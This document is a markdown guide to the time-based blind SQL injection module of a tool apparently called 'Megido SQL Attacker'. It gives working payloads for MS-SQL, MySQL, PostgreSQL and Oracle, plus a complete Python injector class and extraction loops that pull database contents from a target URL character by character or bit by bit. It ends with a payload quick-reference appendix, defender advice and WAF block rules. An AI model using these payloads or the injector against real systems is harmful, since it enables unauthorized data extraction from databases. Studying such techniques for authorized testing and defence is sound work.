# Time-Based Blind SQL Injection Guide

## Overview

Time-based blind SQL injection is a technique used to infer database information by monitoring server response times when neither error messages nor content changes are observable. This is often the **last resort** technique when all other methods fail, but it's highly reliable when properly implemented.

This guide documents the comprehensive implementation of time-based blind SQL injection techniques in the Megido SQL Attacker module.

## Motivation and Use Cases

### When to Use Time-Based Blind SQLi

Time-based techniques are essential in scenarios where:

✅ **No visible error messages**: Application suppresses all SQL errors  
✅ **No content differentiation**: Responses are identical regardless of true/false conditions  
✅ **No out-of-band channels**: Cannot use DNS exfiltration, HTTP callbacks, or file system access  
✅ **Boolean-based detection fails**: Content-based inference is unreliable or impossible  
✅ **Error-based detection fails**: No exploitable errors are triggered

### Real-World Scenarios

1. **Highly sanitized applications** with strict error handling
2. **WAF-protected environments** where content-based techniques are blocked
3. **Limited SQL syntax** contexts where complex queries are restricted
4. **Blind authentication bypass** where response content doesn't change
5. **Stored procedure injections** with no visible output

## How Time-Based Blind SQL Injection Works

### Basic Principle

1. **Inject a time-delay function** conditioned on a testable predicate
2. **Measure server response time** for each request
3. **Infer true/false** based on whether delay occurred
4. **Extract data character-by-character** or bit-by-bit

### Example Flow

```
Normal Request:        Response Time: 0.2s → Baseline
True Condition + Delay: Response Time: 5.2s → Condition is TRUE
False Condition:        Response Time: 0.2s → Condition is FALSE
```

### Statistical Analysis

Time-based detection requires robust statistical analysis to handle:
- Network latency variations
- Server load fluctuations
- Application processing time
- Concurrent request interference

The implementation uses multiple statistical tests and confidence scoring to minimize false positives.

---

## Database-Specific Techniques

### 1. Microsoft SQL Server (MS-SQL)

#### WAITFOR DELAY

MS-SQL provides the `WAITFOR DELAY` command specifically designed for time delays.

**Syntax:**
```sql
WAITFOR DELAY 'hours:minutes:seconds'
```

**Basic Examples:**
```sql
-- Simple 5-second delay
'; WAITFOR DELAY '0:0:5'--

-- Conditional delay (delays if condition is true)
' IF (1=1) WAITFOR DELAY '0:0:5'--

-- Conditional delay with query
' IF (SELECT user) = 'sa' WAITFOR DELAY '0:0:5'--
```

**Character Extraction:**
```sql
-- Extract database name character by character
' IF ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=68 WAITFOR DELAY '0:0:5'--
' IF ASCII(SUBSTRING((SELECT DB_NAME()),2,1))=97 WAITFOR DELAY '0:0:5'--
-- Result: D (ASCII 68), a (ASCII 97)...
```

**Bitwise Extraction (More Efficient):**
```sql
-- Test individual bits of ASCII value
' IF ASCII(SUBSTRING((SELECT DB_NAME()),1,1))&128=128 WAITFOR DELAY '0:0:5'--
' IF ASCII(SUBSTRING((SELECT DB_NAME()),1,1))&64=64 WAITFOR DELAY '0:0:5'--
-- Continue for bits 32, 16, 8, 4, 2, 1
```

**Length Detection:**
```sql
' IF LEN(DB_NAME())=6 WAITFOR DELAY '0:0:5'--
```

**Privilege Check:**
```sql
' IF IS_SRVROLEMEMBER('sysadmin')=1 WAITFOR DELAY '0:0:5'--
```

---

### 2. MySQL

#### SLEEP Function

MySQL provides the `SLEEP()` function for time delays.

**Syntax:**
```sql
SLEEP(seconds)
```

**Basic Examples:**
```sql
-- Simple 5-second delay
' AND SLEEP(5)--

-- Conditional delay using IF
' AND IF(1=1, SLEEP(5), 0)--

-- Conditional delay with query
' AND IF((SELECT user())='root', SLEEP(5), 0)--
```

**Character Extraction:**
```sql
-- Extract database name
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=116, SLEEP(5), 0)--
' AND IF(ASCII(SUBSTRING((SELECT database()),2,1))=101, SLEEP(5), 0)--
-- Result: t (ASCII 116), e (ASCII 101)...
```

**Bitwise Extraction:**
```sql
-- Test individual bits
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))&128=128, SLEEP(5), 0)--
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))&64=64, SLEEP(5), 0)--
```

**Length Detection:**
```sql
' AND IF(LENGTH(database())=4, SLEEP(5), 0)--
```

**Table Enumeration:**
```sql
' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5, SLEEP(5), 0)--
```

#### BENCHMARK (For Older MySQL Versions)

For MySQL versions without `SLEEP()`, use `BENCHMARK()` to create computational delays.

**Syntax:**
```sql
BENCHMARK(iterations, expression)
```

**Examples:**
```sql
-- Create delay through computation
' AND BENCHMARK(5000000, MD5('test'))--

-- Conditional delay
' AND IF(1=1, BENCHMARK(5000000, SHA1('test')), 0)--

-- Character extraction
' AND IF(ASCII(SUBSTRING(database(),1,1))=116, BENCHMARK(5000000, MD5('test')), 0)--
```

---

### 3. PostgreSQL

#### pg_sleep Function

PostgreSQL provides `pg_sleep()` for time delays.

**Syntax:**
```sql
pg_sleep(seconds)
```

**Basic Examples:**
```sql
-- Simple 5-second delay
'; SELECT pg_sleep(5)--

-- Conditional delay using CASE
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Conditional delay with query
' AND (SELECT CASE WHEN (current_user='postgres') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

**Character Extraction:**
```sql
-- Extract database name
' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT current_database()),1,1))=112 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT current_database()),2,1))=111 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
-- Result: p (ASCII 112), o (ASCII 111)...
```

**Bitwise Extraction:**
```sql
-- Test individual bits
' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT current_database()),1,1))&128)=128 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

**Length Detection:**
```sql
' AND (SELECT CASE WHEN LENGTH(current_database())=8 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

**Version Detection:**
```sql
' AND (SELECT CASE WHEN version() LIKE '%PostgreSQL 13%' THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

---

### 4. Oracle

#### UTL_HTTP.request (Network Timeout Method)

Oracle doesn't have a direct sleep function, but `UTL_HTTP.request()` can be used to create timeouts by attempting connections to non-existent hosts.

**Basic Examples:**
```sql
-- Create timeout through failed HTTP request
' AND (SELECT UTL_HTTP.request('http://nonexistent-domain-for-sqli-test-12345.com') FROM dual)='x'--

-- Use unreachable IP to create timeout
' OR (SELECT UTL_HTTP.request('http://192.0.2.1:81/') FROM dual)='x'--

-- Conditional delay using CASE
' AND (SELECT CASE WHEN (1=1) THEN UTL_HTTP.request('http://192.0.2.1:81/') ELSE 'ok' END FROM dual)='ok'--
```

**Character Extraction:**
```sql
-- Extract username
' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT user FROM dual),1,1))=83 THEN UTL_HTTP.request('http://192.0.2.1:81/') ELSE 'ok' END FROM dual)='ok'--
```

**Bitwise Extraction:**
```sql
-- Test individual bits using BITAND
' AND (SELECT CASE WHEN BITAND(ASCII(SUBSTR((SELECT user FROM dual),1,1)),128)=128 THEN UTL_HTTP.request('http://192.0.2.1:81/') ELSE 'ok' END FROM dual)='ok'--
```

#### DBMS_LOCK.SLEEP (Alternative - Requires Privileges)

If the user has sufficient privileges, `DBMS_LOCK.SLEEP()` can be used for precise delays.

**Examples:**
```sql
-- Simple delay (requires privileges)
' AND (SELECT DBMS_LOCK.SLEEP(5) FROM dual) IS NULL--

-- Conditional delay
' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual) IS NOT NULL--

-- Character extraction
' AND (SELECT CASE WHEN ASCII(SUBSTR(user,1,1))=83 THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual) IS NOT NULL--
```

---

## Detection Probes

### Quick Database Detection

Before extraction, identify the database backend using short delay probes:

**MySQL Detection:**
```sql
' AND SLEEP(1)--
' OR SLEEP(1)='1
```

**MS-SQL Detection:**
```sql
'; WAITFOR DELAY '0:0:1'--
' WAITFOR DELAY '0:0:1'--
```

**PostgreSQL Detection:**
```sql
'; SELECT pg_sleep(1)--
' AND pg_sleep(1)::text='0'--
```

**Oracle Detection:**
```sql
' AND DBMS_LOCK.SLEEP(1) IS NULL--
```

---

## Extraction Techniques

### 1. Character-by-Character Extraction

**Advantages:**
- Simple implementation
- Easy to debug
- Works with all ASCII characters

**Disadvantages:**
- ~95 requests per character (ASCII 32-126)
- Slower for long strings

**Algorithm:**
```
FOR each position (1 to max_length):
    FOR each ASCII code (32 to 126):
        Test if character at position equals ASCII code
        IF response is delayed:
            Character found! Add to result
            BREAK to next position
```

**Example (MySQL):**
```python
# Extract database name character by character
query = "database()"
result = ""
for position in range(1, 20):
    for ascii_code in range(32, 127):
        payload = f"' AND IF(ASCII(SUBSTRING(({query}),{position},1))={ascii_code}, SLEEP(5), 0)--"
        response_time = test_payload(payload)
        if response_time > 5:
            result += chr(ascii_code)
            break
    if not found_char:
        break  # End of string
print(f"Extracted: {result}")
```

---

### 2. Bitwise Extraction (More Efficient)

**Advantages:**
- Only 8 requests per character
- 91% reduction in requests
- Faster extraction

**Disadvantages:**
- Slightly more complex
- Requires bitwise operations support

**Algorithm:**
```
FOR each position (1 to max_length):
    ascii_value = 0
    FOR each bit (7 down to 0):
        mask = 2^bit
        Test if (character & mask) == mask
        IF response is delayed:
            ascii_value = ascii_value OR mask
    IF ascii_value == 0:
        BREAK  # End of string
    result += chr(ascii_value)
```

**Example (MS-SQL):**
```python
# Bitwise extraction for MS-SQL
query = "DB_NAME()"
result = ""
for position in range(1, 20):
    ascii_value = 0
    for bit in range(7, -1, -1):
        mask = 1 << bit
        payload = f"' IF ASCII(SUBSTRING(({query}),{position},1))&{mask}={mask} WAITFOR DELAY '0:0:5'--"
        response_time = test_payload(payload)
        if response_time > 5:
            ascii_value |= mask
    if ascii_value == 0:
        break
    result += chr(ascii_value)
print(f"Extracted: {result}")
```

**Performance Comparison:**

| String Length | Character-by-Character | Bitwise | Speedup |
|--------------|----------------------|---------|---------|
| 10 chars | ~950 requests | 80 requests | 91% |
| 50 chars | ~4,750 requests | 400 requests | 91% |
| 100 chars | ~9,500 requests | 800 requests | 91% |

---

## Python Implementation Example

### Complete Time-Based Injection Test

```python
import time
import statistics
import requests

class TimeBasedSQLInjector:
    """Simple time-based blind SQL injection tester"""
    
    def __init__(self, url, param, delay_seconds=5):
        self.url = url
        self.param = param
        self.delay_seconds = delay_seconds
        self.baseline_times = []
    
    def establish_baseline(self, samples=5):
        """Establish baseline response time"""
        print(f"[*] Establishing baseline with {samples} samples...")
        for i in range(samples):
            start = time.time()
            requests.get(self.url, params={self.param: "1"})
            elapsed = time.time() - start
            self.baseline_times.append(elapsed)
            print(f"    Sample {i+1}: {elapsed:.3f}s")
        
        avg = statistics.mean(self.baseline_times)
        std = statistics.stdev(self.baseline_times)
        print(f"[+] Baseline: {avg:.3f}s ± {std:.3f}s\n")
        return avg
    
    def test_payload(self, payload):
        """Test a payload and measure response time"""
        start = time.time()
        try:
            requests.get(self.url, params={self.param: payload}, timeout=15)
        except requests.Timeout:
            return 15.0  # Timeout indicates delay
        return time.time() - start
    
    def detect_vulnerability(self, dbms="mysql"):
        """Detect time-based SQL injection"""
        print(f"[*] Testing for time-based SQLi ({dbms})...")
        
        baseline = statistics.mean(self.baseline_times)
        threshold = self.delay_seconds * 0.8
        
        # Test payloads
        if dbms == "mysql":
            true_payload = f"1' AND SLEEP({self.delay_seconds})--"
            false_payload = f"1' AND IF(1=2, SLEEP({self.delay_seconds}), 0)--"
        elif dbms == "mssql":
            true_payload = f"1'; WAITFOR DELAY '0:0:{self.delay_seconds}'--"
            false_payload = f"1'; IF (1=2) WAITFOR DELAY '0:0:{self.delay_seconds}'--"
        elif dbms == "postgresql":
            true_payload = f"1'; SELECT pg_sleep({self.delay_seconds})--"
            false_payload = f"1'; SELECT CASE WHEN (1=2) THEN pg_sleep({self.delay_seconds}) ELSE pg_sleep(0) END--"
        else:
            return False
        
        # Test TRUE condition (should delay)
        print(f"[*] Testing TRUE condition payload...")
        true_time = self.test_payload(true_payload)
        print(f"    Response time: {true_time:.3f}s")
        
        # Test FALSE condition (should NOT delay)
        print(f"[*] Testing FALSE condition payload...")
        false_time = self.test_payload(false_payload)
        print(f"    Response time: {false_time:.3f}s")
        
        # Analysis
        true_delayed = (true_time - baseline) >= threshold
        false_not_delayed = (false_time - baseline) < threshold
        
        if true_delayed and false_not_delayed:
            print(f"\n[+] VULNERABLE! Time-based blind SQLi detected!")
            print(f"    Baseline: {baseline:.3f}s")
            print(f"    TRUE condition: {true_time:.3f}s (delayed)")
            print(f"    FALSE condition: {false_time:.3f}s (not delayed)")
            return True
        else:
            print(f"\n[-] Not vulnerable or inconclusive")
            return False
    
    def extract_data(self, query, dbms="mysql", max_length=50):
        """Extract data using time-based blind SQLi"""
        print(f"\n[*] Extracting data: {query}")
        
        baseline = statistics.mean(self.baseline_times)
        threshold = self.delay_seconds * 0.8
        result = ""
        
        for position in range(1, max_length + 1):
            found = False
            for ascii_code in range(32, 127):
                # Build payload based on DBMS
                if dbms == "mysql":
                    payload = f"1' AND IF(ASCII(SUBSTRING(({query}),{position},1))={ascii_code}, SLEEP({self.delay_seconds}), 0)--"
                elif dbms == "mssql":
                    payload = f"1' IF ASCII(SUBSTRING(({query}),{position},1))={ascii_code} WAITFOR DELAY '0:0:{self.delay_seconds}'--"
                elif dbms == "postgresql":
                    payload = f"1' AND (SELECT CASE WHEN ASCII(SUBSTRING(({query}),{position},1))={ascii_code} THEN pg_sleep({self.delay_seconds}) ELSE pg_sleep(0) END)::text='0'--"
                else:
                    return None
                
                response_time = self.test_payload(payload)
                
                if (response_time - baseline) >= threshold:
                    char = chr(ascii_code)
                    result += char
                    print(f"    Position {position}: '{char}' (ASCII {ascii_code}) → {result}")
                    found = True
                    break
            
            if not found:
                break  # End of string
        
        print(f"\n[+] Extraction complete: {result}")
        return result


# Example usage
if __name__ == "__main__":
    # Test MySQL time-based blind SQLi
    injector = TimeBasedSQLInjector(
        url="http://target.com/page.php",
        param="id",
        delay_seconds=5
    )
    
    # Establish baseline
    injector.establish_baseline(samples=5)
    
    # Detect vulnerability
    if injector.detect_vulnerability(dbms="mysql"):
        # Extract database name
        db_name = injector.extract_data("database()", dbms="mysql", max_length=20)
        
        # Extract version
        version = injector.extract_data("version()", dbms="mysql", max_length=30)
```

**Output Example:**
```
[*] Establishing baseline with 5 samples...
    Sample 1: 0.234s
    Sample 2: 0.221s
    Sample 3: 0.245s
    Sample 4: 0.229s
    Sample 5: 0.238s
[+] Baseline: 0.233s ± 0.009s

[*] Testing for time-based SQLi (mysql)...
[*] Testing TRUE condition payload...
    Response time: 5.241s
[*] Testing FALSE condition payload...
    Response time: 0.239s

[+] VULNERABLE! Time-based blind SQLi detected!
    Baseline: 0.233s
    TRUE condition: 5.241s (delayed)
    FALSE condition: 0.239s (not delayed)

[*] Extracting data: database()
    Position 1: 't' (ASCII 116) → t
    Position 2: 'e' (ASCII 101) → te
    Position 3: 's' (ASCII 115) → tes
    Position 4: 't' (ASCII 116) → test

[+] Extraction complete: test
```

---

## Timing Analysis and Statistical Considerations

### Challenges in Time-Based Detection

1. **Network Latency Variability**
   - Internet connections have variable latency
   - Need multiple baseline measurements
   - Use median/mean for robustness

2. **Server Load Fluctuations**
   - Server response times vary with load
   - Background tasks can affect timing
   - Test multiple times for confidence

3. **Concurrent Requests**
   - Other users' requests can interfere
   - Application thread pools may serialize requests
   - Use appropriate delays (3-5 seconds minimum)

### Statistical Techniques

**1. Baseline Establishment**
```python
# Collect multiple baseline samples
baseline_times = []
for _ in range(5):
    baseline_times.append(measure_normal_request())

# Use mean and standard deviation
baseline_mean = statistics.mean(baseline_times)
baseline_std = statistics.stdev(baseline_times)

# Set threshold at baseline + 80% of expected delay
threshold = baseline_mean + (delay_seconds * 0.8)
```

**2. Outlier Detection**
```python
# Remove outliers using median absolute deviation
median = statistics.median(times)
mad = statistics.median([abs(t - median) for t in times])
filtered_times = [t for t in times if abs(t - median) < 2 * mad]
```

**3. Confidence Scoring**
```python
# Calculate confidence based on delay magnitude
time_diff = response_time - baseline_mean
confidence = min(1.0, time_diff / delay_seconds)

# Require confidence > 0.7 for positive detection
if confidence > 0.7:
    print("High confidence delay detected")
```

**4. Multiple Measurements**
```python
# Test payload multiple times for reliability
delayed_count = 0
for _ in range(3):
    response_time = test_payload(payload)
    if response_time - baseline_mean >= threshold:
        delayed_count += 1

# Require majority (2/3) for positive detection
if delayed_count >= 2:
    print("Confirmed delay")
```

---

## Optimization Strategies

### 1. Adaptive Delay Selection

Start with longer delays and decrease if reliable:

```python
# Start with 5 seconds for reliability
initial_delay = 5
successful_tests = 0

for test in tests:
    if test_succeeds:
        successful_tests += 1
        if successful_tests >= 3:
            # Reduce delay if consistently successful
            delay = max(2, initial_delay - 1)
```

### 2. Binary Search for Length Detection

Optimize by detecting string length first:

```python
# Find length using binary search (log(n) complexity)
min_length = 0
max_length = 100

while min_length < max_length:
    mid = (min_length + max_length + 1) // 2
    payload = f"' AND IF(LENGTH({query})>={mid}, SLEEP(5), 0)--"
    
    if is_delayed(test_payload(payload)):
        min_length = mid
    else:
        max_length = mid - 1

actual_length = min_length
print(f"String length: {actual_length}")

# Now extract only actual_length characters
for position in range(1, actual_length + 1):
    # Extract character...
```

### 3. Parallel Testing

Use threading for faster extraction:

```python
from concurrent.futures import ThreadPoolExecutor

def test_char_at_position(position):
    for ascii_code in range(32, 127):
        if test_character(position, ascii_code):
            return chr(ascii_code)
    return None

# Extract multiple positions in parallel (with caution)
with ThreadPoolExecutor(max_workers=3) as executor:
    # Note: Be careful not to overload the target
    results = executor.map(test_char_at_position, range(1, 11))
```

### 4. Charset Optimization

Use knowledge about expected data to reduce charset:

```python
# For database names (usually lowercase + underscore)
charset_dbname = "abcdefghijklmnopqrstuvwxyz0123456789_"

# For version strings (alphanumeric + dots)
charset_version = "0123456789."

# For table names
charset_tables = "abcdefghijklmnopqrstuvwxyz0123456789_$#"
```

---

## Security Considerations

### For Attackers (Authorized Testing Only)

**Stealth:**
- Time-based attacks generate normal-looking requests
- No obvious injection patterns in logs (just queries with delays)
- Slower than other techniques but harder to detect

**Noise Reduction:**
- Use reasonable delays (3-5 seconds)
- Avoid excessive request volumes
- Respect rate limits

**Legal Considerations:**
- ⚠️ **Only test systems you have explicit authorization to test**
- Document all testing activities
- Follow responsible disclosure practices

### For Defenders

**Detection:**
- Monitor for unusual response time patterns
- Look for repetitive requests with consistent delays
- Track requests with time-delay SQL functions in logs

**Prevention:**
1. **Parameterized Queries**: Use prepared statements
2. **Input Validation**: Sanitize all user inputs
3. **Least Privilege**: Limit database user permissions
4. **WAF Rules**: Block known time-delay patterns
5. **Rate Limiting**: Prevent high-frequency testing
6. **Query Timeouts**: Set maximum query execution time

**Example WAF Rules:**
```
# Block common time-delay functions
Block if query contains: SLEEP, WAITFOR, pg_sleep, BENCHMARK, DBMS_LOCK.SLEEP, UTL_HTTP

# Detect time-delay patterns
Alert if response_time > 3 seconds AND request_count > 10 in 60 seconds
```

---

## Integration with Megido SQL Attacker

### Using the Time-Based Detector

```python
from sql_attacker.time_based_blind_detector import TimeBasedBlindDetector, DBMSType

# Initialize detector
detector = TimeBasedBlindDetector(
    delay_seconds=5,
    threshold_multiplier=0.8,
    baseline_samples=3,
    test_samples=3
)

# Define test function
def test_function(payload, url, param, param_type, **kwargs):
    if param_type == "GET":
        return requests.get(url, params={param: payload})
    else:
        return requests.post(url, data={param: payload})

# Establish baseline
detector.establish_baseline(
    test_function=test_function,
    url="http://target.com/page",
    param="id",
    param_type="GET"
)

# Test for vulnerability
results = detector.test_time_based_injection(
    test_function=test_function,
    url="http://target.com/page",
    param="id",
    param_type="GET",
    dbms_type=DBMSType.MYSQL  # Or None for auto-detection
)

if results['vulnerable']:
    print(f"[+] Vulnerable! Confidence: {results['confidence']:.2f}")
    print(f"    DBMS: {results['dbms_type']}")
    print(f"    Time difference: {results['time_difference']:.2f}s")
    
    # Extract data
    data = detector.extract_data_via_time_delays(
        test_function=test_function,
        url="http://target.com/page",
        param="id",
        param_type="GET",
        query="database()",  # MySQL example
        dbms_type=DBMSType.MYSQL,
        use_bitwise=True  # Use bitwise extraction for efficiency
    )
    print(f"[+] Extracted: {data}")
```

### Automatic Database Detection

```python
# Auto-detect database type
detected_dbms = detector.detect_database_backend(
    test_function=test_function,
    url="http://target.com/page",
    param="id",
    param_type="GET"
)

if detected_dbms:
    print(f"[+] Detected DBMS: {detected_dbms.value}")
```

---

## Testing

### Unit Tests

The module includes comprehensive unit tests:

```bash
# Run time-based blind SQLi tests
python manage.py test sql_attacker.test_time_based_blind
```

### Demo Script

Interactive demonstration script:

```bash
# Run comprehensive demo
python demo_time_based_blind_sqli.py
```

This demonstrates:
- Baseline establishment
- Time-based vulnerability detection
- Database backend detection
- Character-by-character extraction
- Bitwise extraction
- All DBMS-specific payloads

---

## Performance Metrics

### Request Volume

**Character-by-Character Mode:**
- ~95 requests per character (ASCII 32-126)
- 10-character string: ~950 requests
- 50-character string: ~4,750 requests

**Bitwise Mode (Recommended):**
- 8 requests per character
- 10-character string: 80 requests
- 50-character string: 400 requests
- **91% reduction in requests**

### Time Estimates

Assuming 5-second delay + 0.2s network latency:

**Character-by-Character:**
- Per character: ~95 × 5.2s = 494 seconds (8.2 minutes)
- 10 characters: ~82 minutes
- With early termination: ~30-40 minutes (average)

**Bitwise:**
- Per character: 8 × 5.2s = 42 seconds
- 10 characters: ~7 minutes
- **90% time reduction**

### Optimization Impact

| Optimization | Time Saving |
|-------------|-------------|
| Bitwise extraction | 90% |
| Length detection | 10-20% |
| Charset reduction | 20-50% |
| Binary search | 50% (for length) |
| **Combined** | **Up to 95%** |

---

## Comparison with Other Blind Techniques

| Technique | Speed | Stealth | Reliability | Use Case |
|-----------|-------|---------|-------------|----------|
| **Time-Based** | Slow | High | Very High | Last resort, no other options |
| **Boolean-Based** | Fast | Medium | High | Content differentiation available |
| **Error-Based** | Fast | Low | High | Error messages visible |
| **Out-of-Band** | Very Fast | Low | Medium | OOB channels available |

**When to Use Each:**

- **Boolean-Based**: First choice if responses differ consistently
- **Error-Based**: Use if errors are displayed
- **Out-of-Band**: Use if DNS/HTTP exfiltration is possible
- **Time-Based**: Use when all above fail

---

## References and Credits

This implementation is based on research and techniques documented by:

### Primary References

1. **Chris Anley** (NGSSoftware)
   - Pioneer of advanced SQL injection techniques
   - Research on time-based blind SQL injection methods

2. **Sherief Hammad** (NGSSoftware)
   - Contributions to blind SQL injection inference techniques
   - Database-specific exploitation methods

3. **Dafydd Stuttard & Marcus Pinto**
   - "The Web Application Hacker's Handbook" (1st & 2nd Editions)
   - Comprehensive coverage of blind SQL injection techniques
   - Practical exploitation methodologies

### Additional Resources

- OWASP Testing Guide: Blind SQL Injection
- SQLMAP Documentation
- PortSwigger Web Security Academy: Blind SQL Injection
- Database vendor documentation (MS-SQL, MySQL, PostgreSQL, Oracle)

---

## Summary

The Megido SQL Attacker now provides comprehensive time-based blind SQL injection support:

✅ **Database Support**
- Microsoft SQL Server (WAITFOR DELAY)
- MySQL (SLEEP, BENCHMARK)
- PostgreSQL (pg_sleep)
- Oracle (UTL_HTTP, DBMS_LOCK.SLEEP)

✅ **Extraction Methods**
- Character-by-character extraction
- Bitwise extraction (8x faster)
- Automatic DBMS detection
- Length optimization

✅ **Statistical Analysis**
- Baseline establishment
- Outlier detection
- Confidence scoring
- Multiple measurement validation

✅ **Production Ready**
- Comprehensive unit tests
- Interactive demonstrations
- Detailed documentation
- Integration with main engine

Time-based blind SQL injection is the most reliable technique when all other methods fail, and this implementation provides robust, automated support for real-world scenarios.

---

## Appendix: Payload Quick Reference

### MySQL
```sql
-- Detection
' AND SLEEP(5)--

-- Extraction
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=116, SLEEP(5), 0)--

-- Bitwise
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))&128=128, SLEEP(5), 0)--
```

### MS-SQL
```sql
-- Detection
'; WAITFOR DELAY '0:0:5'--

-- Extraction
' IF ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=68 WAITFOR DELAY '0:0:5'--

-- Bitwise
' IF ASCII(SUBSTRING((SELECT DB_NAME()),1,1))&128=128 WAITFOR DELAY '0:0:5'--
```

### PostgreSQL
```sql
-- Detection
'; SELECT pg_sleep(5)--

-- Extraction
' AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT current_database()),1,1))=112 THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Bitwise
' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT current_database()),1,1))&128)=128 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

### Oracle
```sql
-- Detection
' AND DBMS_LOCK.SLEEP(5) IS NULL--

-- Extraction (UTL_HTTP)
' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT user FROM dual),1,1))=83 THEN UTL_HTTP.request('http://192.0.2.1:81/') ELSE 'ok' END FROM dual)='ok'--

-- Extraction (DBMS_LOCK)
' AND (SELECT CASE WHEN ASCII(SUBSTR(user,1,1))=83 THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual) IS NOT NULL--
```

---

**Document Version:** 1.0  
**Last Updated:** 2026-02-18  
**Module:** `sql_attacker/time_based_blind_detector.py`
